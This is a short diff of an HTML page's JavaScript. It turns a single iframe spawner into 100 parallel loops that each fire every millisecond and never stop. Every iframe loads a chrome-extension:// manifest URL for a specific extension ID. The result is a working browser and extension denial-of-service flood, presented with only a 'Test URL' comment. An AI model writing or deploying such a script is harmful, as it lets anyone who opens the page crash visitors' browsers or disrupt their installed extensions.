@@ -18,24 +18,23 @@
     <div id="container"></div>
 
     <script>
-        let interval = 1; // Set to 1 ms for very fast spawning
-        let spawnInterval;
+        let interval = 1; // Fast interval for each set
+        let numSets = 100; // Number of sets running in parallel
 
         document.getElementById('start').addEventListener('click', function() {
             const container = document.getElementById('container');
 
-            // Clear any previous interval
-            clearInterval(spawnInterval);
-
-            // Define the function to spawn iframes
+            // Function to spawn iframes
             const spawnIFrames = () => {
                 const iframe = document.createElement('iframe');
-                iframe.src = "about:blank"; // Test URL
+                iframe.src = "chrome-extension://cjpalhdlnbpafiamejdnhcphjbkeiagm/manifest.json"; // Test URL, replace with desired URL if needed
                 container.appendChild(iframe);
             };
 
-            // Start the spawning with the very fast interval
-            spawnInterval = setInterval(spawnIFrames, interval);
+            // Start multiple spawning loops simultaneously
+            for (let i = 0; i < numSets; i++) {
+                setInterval(spawnIFrames, interval);
+            }
         });
     </script>
 </body>
